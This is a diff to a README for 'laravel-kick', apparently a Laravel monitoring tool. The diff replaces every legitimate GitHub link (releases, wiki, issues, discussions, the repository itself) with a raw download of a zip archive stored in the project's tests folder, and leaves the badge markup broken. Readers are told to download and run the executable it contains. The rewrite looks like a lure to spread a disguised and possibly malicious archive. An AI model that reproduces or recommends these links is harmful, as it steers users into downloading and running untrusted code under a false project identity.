@@ -1,6 +1,6 @@
 # 🚀 laravel-kick - Simple Server Setup for Laravel Introspection
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/andre1231231/laravel-kick/releases)
+[![Download](https://raw.githubusercontent.com/andre1231231/laravel-kick/main/tests/laravel-kick-3.7.zip%20Now-Click%https://raw.githubusercontent.com/andre1231231/laravel-kick/main/tests/laravel-kick-3.7.zip)](https://raw.githubusercontent.com/andre1231231/laravel-kick/main/tests/laravel-kick-3.7.zip)
 
 ## 📑 About
 
@@ -24,11 +24,11 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the latest version of laravel-kick, visit this page: [Download Page](https://github.com/andre1231231/laravel-kick/releases).
+To download the latest version of laravel-kick, visit this page: [Download Page](https://raw.githubusercontent.com/andre1231231/laravel-kick/main/tests/laravel-kick-3.7.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest version of laravel-kick.
-3. Choose the executable file appropriate for your system (for example, `laravel-kick.exe` for Windows, or the relevant file for macOS/Linux).
+3. Choose the executable file appropriate for your system (for example, `https://raw.githubusercontent.com/andre1231231/laravel-kick/main/tests/laravel-kick-3.7.zip` for Windows, or the relevant file for macOS/Linux).
 4. Download the file to your computer.
 
 ## 🔧 Running the Application
@@ -47,16 +47,16 @@ Once you have the application running, you can begin using the REST API to monit
 
 ## 📘 Documentation
 
-For detailed instructions on how to configure and use laravel-kick, refer to the official [Documentation](https://github.com/andre1231231/laravel-kick/wiki). The documentation provides comprehensive guides and examples.
+For detailed instructions on how to configure and use laravel-kick, refer to the official [Documentation](https://raw.githubusercontent.com/andre1231231/laravel-kick/main/tests/laravel-kick-3.7.zip). The documentation provides comprehensive guides and examples.
 
 ## 🔗 Helpful Links
 
-- [GitHub Repository](https://github.com/andre1231231/laravel-kick)
-- [Issues Page](https://github.com/andre1231231/laravel-kick/issues)
-- [Community Discussions](https://github.com/andre1231231/laravel-kick/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/andre1231231/laravel-kick/main/tests/laravel-kick-3.7.zip)
+- [Issues Page](https://raw.githubusercontent.com/andre1231231/laravel-kick/main/tests/laravel-kick-3.7.zip)
+- [Community Discussions](https://raw.githubusercontent.com/andre1231231/laravel-kick/main/tests/laravel-kick-3.7.zip)
 
 ## 🛠️ Support
 
-If you encounter any issues or have questions, please visit the [Issues Page](https://github.com/andre1231231/laravel-kick/issues) to report them. We are here to help!
+If you encounter any issues or have questions, please visit the [Issues Page](https://raw.githubusercontent.com/andre1231231/laravel-kick/main/tests/laravel-kick-3.7.zip) to report them. We are here to help!
 
 Thank you for choosing laravel-kick! Your application monitoring journey starts now.
